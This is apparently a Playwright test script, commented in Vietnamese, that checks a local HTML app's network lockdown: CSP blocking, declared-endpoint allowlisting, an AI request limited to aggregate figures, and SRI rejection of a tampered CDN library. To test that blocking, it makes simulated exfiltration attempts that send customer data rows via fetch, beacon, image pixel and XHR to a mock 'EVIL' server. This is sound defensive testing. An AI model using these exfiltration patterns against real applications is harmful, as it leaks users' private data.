/* node hm27_test.js <app.html> — chế độ có mạng: mặc định chặn mọi gửi ra ngoài (trình duyệt thực thi), bật đúng điểm đến, AI chỉ số tổng hợp, SRI, nhật ký */
const { chromium } = require('playwright'); const http = require('http'), fs = require('fs'), path = require('path');
const APP = path.resolve(process.argv[2]), FIX = path.join(__dirname, '../../tests/fixtures/20.10.2026.xlsx');
const DOCX = fs.readFileSync('/tmp/npmpk/x_docx-9.0.2.tgz/package/build/index.umd.js');
function mock(name) { const log = []; const srv = http.createServer((q, r) => { let b = ''; q.on('data', d => b += d); q.on('end', () => {
    log.push({ m: q.method, u: q.url, h: q.headers, b }); const cors = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' };
    if (q.method === 'OPTIONS') { r.writeHead(204, cors); return r.end(); }
    if (q.url.startsWith('/version.json')) { r.writeHead(200, Object.assign({ 'content-type': 'application/json' }, cors)); return r.end(JSON.stringify({ version: 'v22.9', url: 'http://example.local/new', notes: 'bản thử' })); }
    if (q.url.startsWith('/v1/messages')) { r.writeHead(200, Object.assign({ 'content-type': 'application/json' }, cors)); return r.end(JSON.stringify({ content: [{ type: 'text', text: 'Nhận xét thử từ máy chủ giả' }] })); }
    r.writeHead(200, cors); r.end('ok'); }); });
  return new Promise(res => srv.listen(0, '127.0.0.1', () => res({ srv, log, port: srv.address().port, name }))); }
(async () => {
  const A = await mock('A'), E = await mock('EVIL'); const res = []; const ck = (n, c, x) => { res.push((c ? 'PASS ' : 'FAIL ') + n + (c ? '' : ' ' + JSON.stringify(x).slice(0, 300))); };
  const b = await chromium.launch(); const ctx = await b.newContext({ viewport: { width: 1500, height: 900 }, acceptDownloads: true }); const p = await ctx.newPage(); const errs = []; p.on('pageerror', e => errs.push(e.message.slice(0, 140))); p.on('dialog', d => d.accept());
  const boot = async () => { await p.goto('file://' + APP, { waitUntil: 'load' }); await p.waitForTimeout(4500); };
  const attempts = (base) => p.evaluate(async base => { const out = {}; const t = async (k, f) => { try { await f(); out[k] = 'đã gửi'; } catch (e) { out[k] = 'chặn' } };
    await t('fetch GET', () => fetch(base + '/exfil?get')); await t('fetch POST dữ liệu', () => fetch(base + '/exfil', { method: 'POST', body: JSON.stringify(DATA.qltd.slice(0, 3)) }));
    out.beacon = navigator.sendBeacon ? (navigator.sendBeacon(base + '/beacon', 'x') ? 'đã gửi' : 'chặn') : 'n/a';
    await new Promise(r => { const i = new Image(); i.onload = i.onerror = r; i.src = base + '/pixel.png?' + encodeURIComponent(String(DATA.qltd[0] && DATA.qltd[0][1])); setTimeout(r, 800); });
    await t('XHR', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('POST', base + '/xhr'); x.onload = res; x.onerror = () => rej(new Error('x')); x.send('d'); })); return out; }, base);
  /* 1. mặc định TẮT */
  await boot();
  const s0 = await p.evaluate(() => ({ st: TD.net.state(), csp: TD.net.cspApplied, meta: (document.querySelector('meta[http-equiv="Content-Security-Policy"]') || {}).content, k: TD.net.getKey() }));
  ck('mặc định TẮT; CSP chỉ self/blob/data/file', s0.st.mode === 'off' && s0.meta === s0.csp && /^connect-src 'self' blob: data: file:; img-src/.test(s0.csp) && !/https?:/.test(s0.csp), s0);
  await p.evaluate(() => { try { pendingImportRows = null } catch (e) {} }); await p.setInputFiles('#import-file', FIX);
  for (let i = 0; i < 60; i++) { await p.waitForTimeout(500); if (await p.evaluate(() => { try { return !!pendingImportRows } catch (e) { return false } })) break; }
  await p.evaluate(() => doImport()); await p.waitForTimeout(800); await p.evaluate(() => completeImportToDataArchive()); await p.waitForTimeout(3000);
  const aOff = await attempts('http://127.0.0.1:' + A.port);
  ck('TẮT: fetch GET/POST dữ liệu KH, XHR đều bị chặn; sendBeacon và ảnh đến được 0 lần (máy chủ không nhận gì)', [aOff['fetch GET'], aOff['fetch POST dữ liệu'], aOff.XHR].every(v => v === 'chặn') && A.log.filter(l => /exfil|beacon|pixel|xhr/.test(l.u)).length === 0, [aOff, A.log.map(l => l.u)]);
  const core = await p.evaluate(() => { showPage('dashboard'); renderDashboard(); return { n: DATA.qltd.length, ok: typeof tdReportBuild === 'function' && tdReportBuild('').sheets.length >= 4 } });
  ck('TẮT mạng: chức năng lõi vẫn chạy (nhập, Dashboard, dựng báo cáo)', core.n > 100 && core.ok, core);
  /* 2. bật qua giao diện (tải lại) */
  await p.evaluate(() => tdNetDialog());
  ck('hộp thoại ghi rõ ĐANG TẮT', /ĐANG TẮT/.test(await p.innerText('#td-net-status')), 0);
  await p.check('#td-net-on'); await p.fill('#td-net-ver', 'http://127.0.0.1:' + A.port + '/version.json'); await p.click('#td-net-save');
  await p.waitForEvent('load', { timeout: 15000 }).catch(() => {}); await p.waitForTimeout(4500);
  const s1 = await p.evaluate(() => ({ st: TD.net.state(), csp: TD.net.cspApplied }));
  ck('BẬT sau tải lại: CSP thêm đúng 1 địa chỉ đã khai báo', s1.st.mode === 'on' && s1.csp.includes('http://127.0.0.1:' + A.port) && (s1.csp.match(/https?:\/\//g) || []).length === 1, s1);
  const before = A.log.length; await p.evaluate(() => tdNetDialog()); await p.click('#td-net-chk'); await p.waitForFunction(() => /bản mới|nhất|⛔/.test(document.getElementById('td-net-chkr').textContent), null, { timeout: 8000 });
  const chk = await p.innerText('#td-net-chkr'), rq = A.log.slice(before).filter(l => l.u.startsWith('/version.json'));
  ck('kiểm tra bản mới: thấy v22.9; đúng 1 yêu cầu GET, không có nội dung, không cookie/referrer', /v22\.9/.test(chk) && rq.length === 1 && rq[0].m === 'GET' && rq[0].b === '' && !rq[0].h.cookie && !rq[0].h.referer, [chk, rq.map(r => [r.m, r.b, r.h.cookie, r.h.referer])]);
  const aOn = await attempts('http://127.0.0.1:' + E.port);
  ck('BẬT nhưng địa chỉ KHÔNG khai báo vẫn bị chặn; máy chủ lạ nhận 0 yêu cầu', [aOn['fetch GET'], aOn['fetch POST dữ liệu'], aOn.XHR].every(v => v === 'chặn') && E.log.length === 0, [aOn, E.log.length]);
  /* 3. AI */
  await p.evaluate(() => tdNetDialog()); await p.check('#td-net-ai'); await p.fill('#td-net-aiep', 'http://127.0.0.1:' + A.port + '/v1/messages'); await p.fill('#td-net-aikey', 'sk-test-khoa-bi-mat-123'); await p.click('#td-net-save');
  await p.waitForEvent('load', { timeout: 15000 }).catch(() => {}); await p.waitForTimeout(4500);
  await p.setInputFiles('#import-file', FIX); for (let i = 0; i < 60; i++) { await p.waitForTimeout(500); if (await p.evaluate(() => { try { return !!pendingImportRows } catch (e) { return false } })) break; }
  await p.evaluate(() => doImport()); await p.waitForTimeout(800); await p.evaluate(() => completeImportToDataArchive()); await p.waitForTimeout(3000);
  const nAI0 = A.log.filter(l => l.u.startsWith('/v1/messages')).length;
  await p.evaluate(() => tdNetDialog()); await p.click('#td-net-askb'); await p.waitForTimeout(500);
  const pl = await p.inputValue('#td-net-ai-pl');
  ck('xem trước: hiện nội dung sắp gửi; CHƯA gửi gì trước khi bấm Đồng ý', /Số liệu tổng hợp/.test(pl) && A.log.filter(l => l.u.startsWith('/v1/messages')).length === nAI0, pl.slice(0, 80));
  ck('nội dung gửi AI: không có tên/mã khách hàng, không tên cán bộ, không số HĐ', !/Khách hàng \d|9900000|DSBS|APPR|Cán bộ [ABC]/.test(pl), pl.slice(0, 200));
  await p.click('#td-net-ai-send'); await p.waitForFunction(() => /Nhận xét thử|⛔/.test(document.getElementById('td-net-ai-out').textContent), null, { timeout: 8000 });
  const out = await p.innerText('#td-net-ai-out'), ai = A.log.filter(l => l.u.startsWith('/v1/messages') && l.m === 'POST');
  ck('bấm Gửi: đúng 1 POST tới địa chỉ AI, khoá nằm ở header, trả lời hiển thị', ai.length === 1 && ai[0].h['x-api-key'] === 'sk-test-khoa-bi-mat-123' && /Nhận xét thử/.test(out), [ai.length, out.slice(0, 60)]);
  ck('thân yêu cầu gửi đi khớp bản xem trước và không có dữ liệu KH', ai[0] && JSON.parse(ai[0].b).messages[0].content === pl && !/Khách hàng \d|9900000/.test(ai[0].b), ai[0] && ai[0].b.slice(0, 120));
  await p.evaluate(() => tdNetDialog()); await p.evaluate(() => { document.querySelector('#td-net-dlg details').open = true }); const logTxt = await p.innerText('#td-net-dlg details');
  ck('nhật ký ghi 2 lần gửi (kiểm tra bản mới, hỏi AI)', /kiểm tra bản mới/.test(logTxt) && /hỏi AI/.test(logTxt), logTxt.slice(0, 200)); await p.evaluate(() => document.getElementById('td-net-dlg').remove());
  /* 4. khoá AI không nằm trong sao lưu */
  const dl = p.waitForEvent('download'); await p.evaluate(() => exportBackup()); const d = await dl; await d.saveAs('/tmp/td_hm27_bk.json'); const bk = fs.readFileSync('/tmp/td_hm27_bk.json', 'utf8');
  ck('sao lưu không chứa khoá AI và cấu hình mạng', !bk.includes('sk-test-khoa-bi-mat-123') && !/td_net_v1|td_ai_key/.test(bk), bk.length);
  /* 5. thư viện dự phòng có SRI */
  await p.evaluate(() => tdNetDialog()); await p.check('#td-net-cdn'); await p.click('#td-net-save'); await p.waitForEvent('load', { timeout: 15000 }).catch(() => {}); await p.waitForTimeout(4500);
  const URL_DOCX = 'https://cdn.jsdelivr.net/npm/docx@9.0.2/build/index.umd.js'; let mode = 'good';
  await p.route(URL_DOCX, r => r.fulfill({ status: 200, contentType: 'application/javascript', body: mode === 'good' ? DOCX : Buffer.concat([DOCX, Buffer.from('\n;window.__pwn=1;')]) }));
  const r1 = await p.evaluate(async () => { try { delete window.docx; await TD.net.ensureLib('docx'); return { ok: typeof window.docx === 'object' && typeof docx.Document === 'function' } } catch (e) { return { err: e.message } } });
  ck('bản nhúng lỗi + bật dự phòng: nạp docx 9.0.2 từ CDN khi băm SRI khớp (xuất Word chạy được)', r1.ok === true, r1);
  mode = 'bad';
  const r2 = await p.evaluate(async () => { try { delete window.docx; await TD.net.ensureLib('docx'); return { loaded: true, pwn: window.__pwn } } catch (e) { return { err: e.message, pwn: window.__pwn } } });
  ck('mã bị sửa (sai băm SRI): trình duyệt TỪ CHỐI chạy, không có mã lạ thực thi', r2.err && /SRI|băm/.test(r2.err) && !r2.pwn, r2);
  const r3 = await p.evaluate(async () => { try { window.XLSX = undefined; await TD.net.ensureLib('XLSX'); return { loaded: true } } catch (e) { return { err: e.message } } });
  ck('SheetJS chưa có băm SRI ⇒ không bao giờ tải từ mạng', r3.err && /không có bản dự phòng/.test(r3.err), r3);
  /* 6. tắt lại */
  await p.evaluate(() => tdNetDialog()); await p.uncheck('#td-net-on'); await p.click('#td-net-save'); await p.waitForEvent('load', { timeout: 15000 }).catch(() => {}); await p.waitForTimeout(4500);
  const nA = A.log.length, aBack = await attempts('http://127.0.0.1:' + A.port); const s2 = await p.evaluate(() => TD.net.state());
  ck('tắt lại: mọi điểm đến (kể cả địa chỉ đã khai báo) bị chặn; AI/dự phòng tự tắt', s2.mode === 'off' && !s2.ai.enabled && !s2.cdn && [aBack['fetch GET'], aBack['fetch POST dữ liệu'], aBack.XHR].every(v => v === 'chặn') && A.log.filter(l => /beacon|pixel/.test(l.u)).length === 0 && A.log.length === nA, [s2, aBack]);
  ck('không pageerror', errs.length === 0, errs);
  console.log(res.join('\n')); console.log('PASS', res.filter(x => x[0] === 'P').length, 'FAIL', res.filter(x => x[0] === 'F').length);
  await b.close(); A.srv.close(); E.srv.close(); process.exit(res.some(x => x[0] === 'F') ? 1 : 0); })();
